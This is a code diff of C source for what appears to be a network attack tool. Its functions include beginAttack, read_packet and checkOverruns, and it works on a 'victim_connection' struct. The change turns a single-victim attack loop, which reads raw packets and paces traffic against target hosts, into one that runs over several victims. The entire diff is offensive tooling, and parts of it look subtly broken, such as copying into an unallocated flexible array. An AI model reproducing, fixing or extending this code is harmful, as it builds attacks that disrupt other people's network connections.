@@ -50,7 +50,7 @@ struct victim_connection {
 
 struct pace_args {
   int socket;
-  struct victim_connection *m_victim;
+  //struct victim_connection *m_victim;
 	unsigned victims;
   int duration;
 	struct victim_connection m_victims[];
@@ -261,7 +261,7 @@ unsigned read_packet(struct victim_connection *m_victim, int sock, struct victim
         source_socket_address.sin_addr.s_addr = ip_packet->saddr;
         memset(&dest_socket_address, 0, sizeof(dest_socket_address));
         dest_socket_address.sin_addr.s_addr = ip_packet->daddr;
-				printf("index: %d \n",getIndex(source_socket_address.sin_addr.s_addr));
+
         if (source_socket_address.sin_addr.s_addr == m_victim->dst_addr) {
 
           unsigned short iphdrlen;
@@ -346,19 +346,21 @@ void processOverruns(unsigned seq, struct victim_connection *m_victim)
 void *checkOverruns(void *vargp) {
 
     struct pace_args *m_args = (struct pace_args*) vargp;
+		int i;
+		for(i=0; i<m_args->victims; i++)
+		{
+    	struct timeval start_time, current_time;
+    	gettimeofday(&start_time, NULL);
+    	gettimeofday(&current_time, NULL);
 
-    struct timeval start_time, current_time;
-    gettimeofday(&start_time, NULL);
-    gettimeofday(&current_time, NULL);
+	    while (current_time.tv_sec - start_time.tv_sec <= m_args->duration) {
 
-    while (current_time.tv_sec - start_time.tv_sec <= m_args->duration) {
+	      unsigned read_seq = read_packet(&(m_args->m_victims[i]), m_args->socket, m_args->m_victims, m_args->victims);
+      	processOverruns(read_seq, &(m_args->m_victims[i]));
 
-      unsigned read_seq = read_packet(m_args->m_victim, m_args->socket, m_args->m_victims, m_args->victims);
-      processOverruns(read_seq, m_args->m_victim);
-
-      gettimeofday(&current_time, NULL);
-    }
-
+      	gettimeofday(&current_time, NULL);
+    	}
+		}
 }
 
 int beginAttack(int duration, double target_rate) {
@@ -413,10 +415,13 @@ int beginAttack(int duration, double target_rate) {
     pthread_t tid;
     struct pace_args p_args;
     p_args.socket = sock;
-    p_args.m_victim = &m_victim;
-		p_args.m_victims = &m_victims;
-		p_args.victim = victims;
+    //p_args.m_victim = &m_victim;
+		p_args.victims = victims;
     p_args.duration = duration;
+		for(i=0; i<victims; i++)
+		{
+			p_args.m_victims[i] = m_victims[i];
+		}
 
     pthread_create(&tid, NULL, checkOverruns, (void *) &p_args);
 
